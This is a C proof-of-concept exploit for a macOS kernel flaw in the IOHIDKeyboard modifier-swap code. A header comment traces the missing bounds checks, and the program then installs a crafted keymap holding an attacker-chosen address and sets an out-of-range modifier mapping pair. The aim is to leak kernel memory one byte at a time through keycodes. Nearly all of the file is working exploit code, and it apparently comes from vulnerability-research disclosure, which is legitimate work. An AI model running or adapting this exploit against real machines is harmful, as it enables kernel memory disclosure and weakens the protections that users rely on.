/*
clang -o mapping_pairs_arbitrary_read mapping_pairs_arbitrary_read.c -framework IOKit -framework CoreFoundation

By setting the HIDKeyboardModifierMappingPairs property of IOHIDKeyboard we can reach the following code in
IOHIKeyboardMapper.cpp:

  if ((array = OSDynamicCast(OSArray, dict->getObject(kIOHIDKeyboardModifierMappingPairsKey))) && (_parsedMapping.maxMod != -1))
  {
    UInt32 count = array->getCount();    
    if ( count )
    {
      for ( unsigned i=0; i<count; i++)
      {
        OSDictionary *  pair      = OSDynamicCast(OSDictionary, array->getObject(i));
        SInt32      src       = 0;
        SInt32      dst       = 0;
        
        if ( !pair ) continue;
        
        number = OSDynamicCast(OSNumber, pair->getObject(kIOHIDKeyboardModifierMappingSrcKey));
        
        if ( !number ) continue;
        
        src = number->unsigned32BitValue();
                
        number = OSDynamicCast(OSNumber, pair->getObject(kIOHIDKeyboardModifierMappingDstKey));
        
        if ( !number ) continue;
                
        dst = number->unsigned32BitValue();
        
        ...       
 
        if ((src >= NX_MODIFIERKEY_ALPHALOCK) && (src <= NX_MODIFIERKEY_RCOMMAND))
          _modifierSwap_Modifiers[src] = dst;                                       <-- (a)

This code expects an array of dictionaries, each containing two keys (IOHIDKeyboardModifierMappingSrc and
IOHIDKeyboardModifierMappingDst) which have unsigned integer values. The purpose of this code is to allow
swapping of modifier keys. The value dst at (a) is controlled and there is no bounds check to ensure that
it corrisponds to a valid modifier key index.

_modifierSwap_Modifiers is defined as:

#define _modifierSwap_Modifiers    _reserved->modifierSwap_Modifiers

where _reserved->modifierSwap_Modifiers is:

        SInt32      modifierSwap_Modifiers[NX_NUMMODIFIERS];

These values are read here when a modifier key is pressed:
  bool IOHIKeyboardMapper::modifierSwapFilterKey(UInt8 * key)
  {
    unsigned char thisBits = _parsedMapping.keyBits[*key];
    SInt16      modBit = (thisBits & NX_WHICHMODMASK);
    SInt16      swapBit;
    unsigned char *map;
    ... 
    swapBit = _modifierSwap_Modifiers[modBit];              <-- (b)
    ...
    if (((map = _parsedMapping.modDefs[swapBit]) != 0 ) &&  <-- (c)
      ( NEXTNUM(&map, _parsedMapping.shorts) ))
      *key = NEXTNUM(&map, _parsedMapping.shorts);          <-- (d)

swapBit (read at (b)) is completely controlled and there's no bounds checking at (c) to ensure that it falls
within the bounds of _parsedMapping.modDefs.

modDefs is defined as:

  unsigned char *modDefs[NX_NUMMODIFIERS];

and NEXTNUM as:

  static inline int NEXTNUM(unsigned char ** mapping, short shorts)
  {
    int returnValue;    
    if (shorts)
    {
      returnValue = OSSwapBigToHostInt16(*((unsigned short *)*mapping));
      *mapping += sizeof(unsigned short);
    }
    else
    {
      returnValue = **((unsigned char  **)mapping);
      *mapping += sizeof(unsigned char);
    }
    return returnValue;
  }

Here we can see that if we can control a value at a fixed offset from modDefs it will be treated as a char* from
which two values will be read (depening on value of _parsedMapping.shorts either bytes or shorts.) If the first
value is non-zero then the second will be interpreted as a keycode. If it's a valid keycode then this value can
be read by a userspace application, for example like this:

    [NSEvent addLocalMonitorForEventsMatchingMask:NSKeyDownMask
                                          handler:
     ^NSEvent *(NSEvent * event) {
         printf("%02x\n", [event keyCode]);
         return event;
     } ];

We can quite easily fake a pointer to read from at a fixed offset from modDefs by setting our own keymap
and encoding the read target in the specialKeys, since looking at the definition of NXParsedKeyMapping
this array of shorts is at a fixed offset from modDefs:

  typedef struct _NXParsedKeyMapping_ {
    short shorts;
    char  keyBits[NX_NUMKEYCODES];
    int     maxMod;
    unsigned char *modDefs[NX_NUMMODIFIERS];
    int     numDefs;
    unsigned char *keyDefs[NX_NUMKEYCODES];
    int     numSeqs;
    unsigned char *seqDefs[NX_NUMSEQUENCES];
    int     numSpecialKeys;
    unsigned short specialKeys[NX_NUMSPECIALKEYS];
    const unsigned char *mapping;
    int mappingLen; 
  } NXParsedKeyMapping;

This PoC applies such a keymap - by passing an argument the target to read from can be controlled.
By reading modified keycodes you can leak individual bytes of kernel memory.

tested on: MacBookAir5,2 w/ 10.9.3/13d65
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>

#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

// from IOHIDKeyboard.cpp
static const unsigned char map_body[] = {
//      0x00,0x00, // uses shorts
      
      // Modifier Defs
      0x0b,   //Number of modifier keys.  Was 7
      //0x00,0x01,0x39,  //CAPSLOCK, uses one byte.
      0x01,0x01,0x38,
      0x02,0x01,0x3b,
      0x03,0x01,0x3a,
      0x04,0x01,0x37,
      0x05,0x14,0x52,0x41,0x53,0x54,0x55,0x45,0x58,0x57,0x56,0x5b,0x5c,
      0x43,0x4b,0x51,0x7b,0x7d,0x7e,0x7c,0x4e,0x59,
      0x06,0x01,0x72,
      0x07,0x01,0x3f, //NX_MODIFIERKEY_SECONDARYFN 8th modifier
      0x09,0x01,0x3c, //Right shift
      0x0a,0x01,0x3e, //Right control
      0x0b,0x01,0x3d, //Right Option
      0x0c,0x01,0x36, //Right Command
  //replace all 0xff's in the key defs with 0x99, since they have to be expanded differently      
  // key deffs
  0xa2,
  0x0d,0x00,0x61,0x00,0x41,0x00,0x01,0x00,0x01,0x00,0xca,0x00,0xc7,0x00,0x01,0x00,0x01, //00
  0x0d,0x00,0x73,0x00,0x53,0x00,0x13,0x00,0x13,0x00,0xfb,0x00,0xa7,0x00,0x13,0x00,0x13, //01
  0x0d,0x00,0x64,0x00,0x44,0x00,0x04,0x00,0x04,0x01,0x44,0x01,0xb6,0x00,0x04,0x00,0x04, //02
  0x0d,0x00,0x66,0x00,0x46,0x00,0x06,0x00,0x06,0x00,0xa6,0x01,0xac,0x00,0x06,0x00,0x06, //03
  0x0d,0x00,0x68,0x00,0x48,0x00,0x08,0x00,0x08,0x00,0xe3,0x00,0xeb,0x00,0x00,0x18,0x00, //04
  0x0d,0x00,0x67,0x00,0x47,0x00,0x07,0x00,0x07,0x00,0xf1,0x00,0xe1,0x00,0x07,0x00,0x07, //05
  0x0d,0x00,0x7a,0x00,0x5a,0x00,0x1a,0x00,0x1a,0x00,0xcf,0x01,0x57,0x00,0x1a,0x00,0x1a, //06
  0x0d,0x00,0x78,0x00,0x58,0x00,0x18,0x00,0x18,0x01,0xb4,0x01,0xce,0x00,0x18,0x00,0x18, //07
  0x0d,0x00,0x63,0x00,0x43,0x00,0x03,0x00,0x03,0x01,0xe3,0x01,0xd3,0x00,0x03,0x00,0x03, //08
  0x0d,0x00,0x76,0x00,0x56,0x00,0x16,0x00,0x16,0x01,0xd6,0x01,0xe0,0x00,0x16,0x00,0x16, //09
  0x02,0x00,0x3c,0x00,0x3e, //0a
  0x0d,0x00,0x62,0x00,0x42,0x00,0x02,0x00,0x02,0x01,0xe5,0x01,0xf2,0x00,0x02,0x00,0x02, //0b
  0x0d,0x00,0x71,0x00,0x51,0x00,0x11,0x00,0x11,0x00,0xfa,0x00,0xea,0x00,0x11,0x00,0x11, //0c
  0x0d,0x00,0x77,0x00,0x57,0x00,0x17,0x00,0x17,0x01,0xc8,0x01,0xc7,0x00,0x17,0x00,0x17, //0d
  0x0d,0x00,0x65,0x00,0x45,0x00,0x05,0x00,0x05,0x00,0xc2,0x00,0xc5,0x00,0x05,0x00,0x05, //0e
  0x0d,0x00,0x72,0x00,0x52,0x00,0x12,0x00,0x12,0x01,0xe2,0x01,0xd2,0x00,0x12,0x00,0x12, //0f
  0x0d,0x00,0x79,0x00,0x59,0x00,0x19,0x00,0x19,0x00,0xa5,0x01,0xdb,0x00,0x19,0x00,0x19, //10
  0x0d,0x00,0x74,0x00,0x54,0x00,0x14,0x00,0x14,0x01,0xe4,0x01,0xd4,0x00,0x14,0x00,0x14, //11
  0x0a,0x00,0x31,0x00,0x21,0x01,0xad,0x00,0xa1, //12
  0x0e,0x00,0x32,0x00,0x40,0x00,0x32,0x00,0x00,0x00,0xb2,0x00,0xb3,0x00,0x00,0x00,0x00, //13
  0x0a,0x00,0x33,0x00,0x23,0x00,0xa3,0x01,0xba, //14
  0x0a,0x00,0x34,0x00,0x24,0x00,0xa2,0x00,0xa8, //15
  0x0e,0x00,0x36,0x00,0x5e,0x00,0x36,0x00,0x1e,0x00,0xb6,0x00,0xc3,0x00,0x1e,0x00,0x1e, //16
  0x0a,0x00,0x35,0x00,0x25,0x01,0xa5,0x00,0xbd, //17
  0x0a,0x00,0x3d,0x00,0x2b,0x01,0xb9,0x01,0xb1, //18
  0x0a,0x00,0x39,0x00,0x28,0x00,0xac,0x00,0xab, //19
  0x0a,0x00,0x37,0x00,0x26,0x01,0xb0,0x01,0xab, //1a
  0x0e,0x00,0x2d,0x00,0x5f,0x00,0x1f,0x00,0x1f,0x00,0xb1,0x00,0xd0,0x00,0x1f,0x00,0x1f, //1b
  0x0a,0x00,0x38,0x00,0x2a,0x00,0xb7,0x00,0xb4, //1c
  0x0a,0x00,0x30,0x00,0x29,0x00,0xad,0x00,0xbb, //1d
  0x0e,0x00,0x5d,0x00,0x7d,0x00,0x1d,0x00,0x1d,0x00,0x27,0x00,0xba,0x00,0x1d,0x00,0x1d, //1e
  0x0d,0x00,0x6f,0x00,0x4f,0x00,0x0f,0x00,0x0f,0x00,0xf9,0x00,0xe9,0x00,0x0f,0x00,0x0f, //1f
  0x0d,0x00,0x75,0x00,0x55,0x00,0x15,0x00,0x15,0x00,0xc8,0x00,0xcd,0x00,0x15,0x00,0x15, //20
  0x0e,0x00,0x5b,0x00,0x7b,0x00,0x1b,0x00,0x1b,0x00,0x60,0x00,0xaa,0x00,0x1b,0x00,0x1b, //21
  0x0d,0x00,0x69,0x00,0x49,0x00,0x09,0x00,0x09,0x00,0xc1,0x00,0xf5,0x00,0x09,0x00,0x09, //22
  0x0d,0x00,0x70,0x00,0x50,0x00,0x10,0x00,0x10,0x01,0x70,0x01,0x50,0x00,0x10,0x00,0x10, //23
  0x10,0x00,0x0d,0x00,0x03, //24
  0x0d,0x00,0x6c,0x00,0x4c,0x00,0x0c,0x00,0x0c,0x00,0xf8,0x00,0xe8,0x00,0x0c,0x00,0x0c, //25
  0x0d,0x00,0x6a,0x00,0x4a,0x00,0x0a,0x00,0x0a,0x00,0xc6,0x00,0xae,0x00,0x0a,0x00,0x0a, //26
  0x0a,0x00,0x27,0x00,0x22,0x00,0xa9,0x01,0xae, //27
  0x0d,0x00,0x6b,0x00,0x4b,0x00,0x0b,0x00,0x0b,0x00,0xce,0x00,0xaf,0x00,0x0b,0x00,0x0b, //28
  0x0a,0x00,0x3b,0x00,0x3a,0x01,0xb2,0x01,0xa2, //29
  0x0e,0x00,0x5c,0x00,0x7c,0x00,0x1c,0x00,0x1c,0x00,0xe3,0x00,0xeb,0x00,0x1c,0x00,0x1c, //2a
  0x0a,0x00,0x2c,0x00,0x3c,0x00,0xcb,0x01,0xa3, //2b
  0x0a,0x00,0x2f,0x00,0x3f,0x01,0xb8,0x00,0xbf, //2c
  0x0d,0x00,0x6e,0x00,0x4e,0x00,0x0e,0x00,0x0e,0x00,0xc4,0x01,0xaf,0x00,0x0e,0x00,0x0e, //2d
  0x0d,0x00,0x6d,0x00,0x4d,0x00,0x0d,0x00,0x0d,0x01,0x6d,0x01,0xd8,0x00,0x0d,0x00,0x0d, //2e
  0x0a,0x00,0x2e,0x00,0x3e,0x00,0xbc,0x01,0xb3, //2f
  0x02,0x00,0x09,0x00,0x19, //30
  0x0c,0x00,0x20,0x00,0x00,0x00,0x80,0x00,0x00, //31
  0x0a,0x00,0x60,0x00,0x7e,0x00,0x60,0x01,0xbb, //32
  0x02,0x00,0x7f,0x00,0x08, //33
  0x99, //34
  0x02,0x00,0x1b,0x00,0x7e, //35
  0x99, //36
  0x99, //37
  0x99, //38
  0x99, //39
  0x99, //3a
  0x99, //3b
  0x99, //3c
  0x99, //3d
  0x99, //3e
  0x99, //3f
  0x00,0xfe,0x36, //40 is F17
  0x00,0x00,0x2e, //41
  0x99, //42
  0x00,0x00,0x2a, //43
  0x99, //44
  0x00,0x00,0x2b, //45
  0x99, //46
  0x00,0x00,0x1b, //47
  0x99, //48
  0x99, //49
  0x99, //4a
  0x0e,0x00,0x2f,0x00,0x5c,0x00,0x2f,0x00,0x1c,0x00,0x2f,0x00,0x5c,0x00,0x00,0x0a,0x00, //4b
  0x00,0x00,0x0d,  //4c //XX03
  0x99, //4d
  0x00,0x00,0x2d, //4e
  0x00,0xfe,0x37, //4f is F18
  0x00,0xfe,0x38, //50 is F19
  0x0e,0x00,0x3d,0x00,0x7c,0x00,0x3d,0x00,0x1c,0x00,0x3d,0x00,0x7c,0x00,0x00,0x18,0x46, //51
  0x00,0x00,0x30, //52
  0x00,0x00,0x31, //53
  0x00,0x00,0x32, //54
  0x00,0x00,0x33, //55
  0x00,0x00,0x34, //56
  0x00,0x00,0x35, //57
  0x00,0x00,0x36, //58
  0x00,0x00,0x37, //59
  0x00,0xfe,0x39, //5a is F20
  0x00,0x00,0x38, //5b
  0x00,0x00,0x39, //5c
  0x99, //5d
  0x99, //5e
  0x99, //5f
  0x00,0xfe,0x24, //60
  0x00,0xfe,0x25, //61
  0x00,0xfe,0x26, //62
  0x00,0xfe,0x22, //63
  0x00,0xfe,0x27, //64
  0x00,0xfe,0x28, //65
  0x99, //66
  0x00,0xfe,0x2a, //67
  0x99, //68
  0x00,0xfe,0x32, //69
  0x00,0xfe,0x35, //6a
  0x00,0xfe,0x33, //6b
  0x99, //6c
  0x00,0xfe,0x29, //6d
  0x99, //6e
  0x00,0xfe,0x2b, //6f
  0x99, //70
  0x00,0xfe,0x34, //71
  0x99, //72
  0x00,0xfe,0x2e, //73
  0x00,0xfe,0x30, //74
  0x00,0xfe,0x2d, //75
  0x00,0xfe,0x23, //76
  0x00,0xfe,0x2f, //77
  0x00,0xfe,0x21, //78
  0x00,0xfe,0x31, //79
  0x00,0xfe,0x20, //7a
  0x00,0x01,0xac, //ADB=0x7b is left arrow
  0x00,0x01,0xae, //ADB = 0x7c is right arrow
  0x00,0x01,0xaf, //ADB=0x7d is down arrow.  
  0x00,0x01,0xad, //ADB=0x7e is up arrow   

      0x00,0x00,0x00, 
      0x00,0x00,0x00, 
      0x00,0x00,0x00, // Virtual = 0x81 is Spotlight
      0x00,0x00,0x00, // Virtual = 0x82 is Dashboard
      0x00,0x00,0x00, // Virtual = 0x83 is Launchpad
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00, // Virtual = 0x90 is Main Brightness Up
      0x00,0x00,0x00, // Virtual = 0x91 is Main Brightness Down
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00,
      0x00,0x00,0x00, // Virtual = 0xa0 is Exposes All
      0x00,0x00,0x00, // Virtual = 0xa1 is Expose Desktop

          0x0f,0x02,0xff,0x04,            
          0x00,0x31,0x02,0xff,0x04,0x00,0x32,0x02,0xff,0x04,0x00,0x33,0x02,0xff,0x04,0x00,
          0x34,0x02,0xff,0x04,0x00,0x35,0x02,0xff,0x04,0x00,0x36,0x02,0xff,0x04,0x00,0x37,
          0x02,0xff,0x04,0x00,0x38,0x02,0xff,0x04,0x00,0x39,0x02,0xff,0x04,0x00,0x30,0x02,
          0xff,0x04,0x00,0x2d,0x02,0xff,0x04,0x00,0x3d,0x02,0xff,0x04,0x00,0x70,0x02,0xff,
          0x04,0x00,0x5d,0x02,0xff,0x04,0x00,0x5b,
          0x0b, // following are 7 special keys - add four more below
          0x04,0x39,  //caps lock
          0x05,0x72,  //NX_KEYTYPE_HELP is 5, ADB code is 0x72
          0x06,0x7f,  //NX_POWER_KEY is 6, ADB code is 0x7f
          0x07,0x4a,  //NX_KEYTYPE_MUTE is 7, ADB code is 0x4a
          0x00,0x48,  //NX_KEYTYPE_SOUND_UP is 0, ADB code is 0x48
          0x01,0x49,  //NX_KEYTYPE_SOUND_DOWN is 1, ADB code is 0x49
          0x0a,0x47   //NX_KEYTYPE_NUM_LOCK is 10, ADB combines with CLEAR key for numlock
  };

void set_mapping(char* map_data, size_t map_len){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOHIDKeyboard");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return;
  }
  printf("got service: %x\n", service);

  CFDataRef data = CFDataCreate(NULL, map_data, map_len);

  err = IORegistryEntrySetCFProperty(
    service,
    CFSTR("HIDKeyMapping"),
    data);
  
  if (err != KERN_SUCCESS){
    printf("setProperty failed\n");
    return;
  }

  printf("set keymap\n");
}

int main(int argc, char** argv){

  uint64_t target_addr = 0x4141414141414141;
  if (argc > 1){
    target_addr = strtoull(argv[1], 0, 16);
  }

  /* convert the map to use shorts */

  size_t body_size = sizeof(map_body);
  uint8_t* header = malloc(body_size*2+2+16);
  header[0] = 0;
  header[1] = 1;
  uint8_t* new_map = &header[2];

  for(size_t i = 0; i < body_size; i++){
    if (map_body[i] == 0x99){
      new_map[i*2] = 0xff;
      new_map[i*2+1] = 0xff;
    } else{
      new_map[i*2] = 0;
      new_map[i*2+1] = map_body[i];
    }
  }


  #define GET_BYTE(v, n) ((uint8_t)((v & (((uint64_t)0xff) << (n*8)) ) >> (n*8)))

  uint64_t to_leak = target_addr - 3;//0xffffff80018ec013 - 3;
  uint8_t* tail = new_map + (body_size*2);
  tail[0] = 0;
  tail[1] = 2;
  tail[2] = GET_BYTE(to_leak, 1);
  tail[3] = GET_BYTE(to_leak, 0); //0xf6; // least significant byte of the pointer
  tail[4] = 0;
  tail[5] = 3;
  tail[6] = GET_BYTE(to_leak, 3);
  tail[7] = GET_BYTE(to_leak, 2);
  tail[8] = 0;
  tail[9] = 4;
  tail[10] = GET_BYTE(to_leak, 5);
  tail[11] = GET_BYTE(to_leak, 4);
  tail[12] = 0;
  tail[13] = 5;
  tail[14] = GET_BYTE(to_leak, 7);
  tail[15] = GET_BYTE(to_leak, 6);
 
  set_mapping(header, body_size*2+2+16);

  printf("set mapping\n");

  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOHIDKeyboard");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);


  SInt32 src = 4; // COMMAND key - press command :-)
  CFNumberRef src_num = CFNumberCreate(kCFAllocatorDefault,
                                       kCFNumberSInt32Type,
                                       &src);

  SInt32 dst = 0x193;
  CFNumberRef dst_num = CFNumberCreate(kCFAllocatorDefault,
                                       kCFNumberSInt32Type,
                                       &dst);

  CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL,
                                                          0,
                                                          &kCFTypeDictionaryKeyCallBacks,
                                                          &kCFTypeDictionaryValueCallBacks);

  CFDictionarySetValue(dict, CFSTR("HIDKeyboardModifierMappingSrc"), src_num);
  CFDictionarySetValue(dict, CFSTR("HIDKeyboardModifierMappingDst"), dst_num);

  CFMutableArrayRef arr = CFArrayCreateMutable(kCFAllocatorDefault,
                                               0,
                                               &kCFTypeArrayCallBacks);

  CFArrayAppendValue(arr, dict);

  err = IORegistryEntrySetCFProperty(
    service,
    CFSTR("HIDKeyboardModifierMappingPairs"),
    arr);
  
  if (err != KERN_SUCCESS){
    printf("setProperty failed\n");
  }

  printf("win?\n");

  return 0;
}
